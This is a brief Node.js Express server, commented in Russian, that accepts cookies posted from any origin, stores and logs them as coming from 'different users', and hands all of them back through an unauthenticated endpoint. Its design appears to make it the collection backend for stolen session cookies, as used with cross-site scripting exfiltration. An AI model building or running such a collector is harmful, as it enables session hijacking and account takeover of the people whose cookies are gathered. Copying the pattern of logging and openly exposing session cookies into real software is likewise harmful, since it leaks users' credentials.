const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const cors = require('cors');

app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public')); // Обслуживание статических файлов из папки 'public'

let userCookies = []; // Хранение куки от разных пользователей

app.post('/api/store-cookies', (req, res) => {
    const { cookies } = req.body;
    // Сохраняем куки в массиве (в реальном приложении используйте базу данных)
    userCookies.push(cookies);
    console.log('Cookies stored:', cookies);
    res.json({ status: 'success' });
});

app.get('/api/get-cookies', (req, res) => {
    res.json(userCookies);
});

app.listen(3000, () => {
    console.log('Server is running on port 3000');
});
